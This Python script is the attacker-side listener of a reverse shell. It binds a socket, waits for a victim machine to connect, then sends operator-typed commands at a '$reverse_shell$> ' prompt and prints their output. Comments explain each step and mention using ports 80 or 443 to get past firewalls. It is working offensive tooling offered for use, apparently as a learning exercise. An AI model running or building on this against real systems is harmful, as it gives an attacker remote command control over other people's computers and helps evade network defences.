#!/usr/bin/env python3

import socket

serverIP = socket.gethostbyname(socket.gethostname())
serverPort = 8016 #usually, malicious reverse shells use popular ports like 80 (http) or 443(https) to bypass firewall
bufferLen = 1024 * 64 # 64kb max size of messages.
space = "<sep>" #separator string for sending 2 messages in one line
address=(serverIP,serverPort)

serverSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
serverSocket.bind(address)
serverSocket.listen()

print(f"Listening as {serverIP}:{serverPort}...")

client_socket, client_address = serverSocket.accept()
#accept() function waits for an incoming connection and returns a new socket representing the connection (client_socket), and the address (IP and port) of the client.
print(f"{client_address[0]}:{client_address[1]} Connected! ")

while True:
	#print("\033[1;31;40m $reverse_shell$>")
	#print("")
	command = input("$reverse_shell$> ")
	if not command.strip():
		continue
	#send the command to the client
	client_socket.send(command.encode())
	if command.lower() == "exit":
		break
	#retrieve command results
	output = client_socket.recv(bufferLen).decode()
	#split command output and curr directory
	print("The output is: \n")
	print(output)


serverSocket.close()


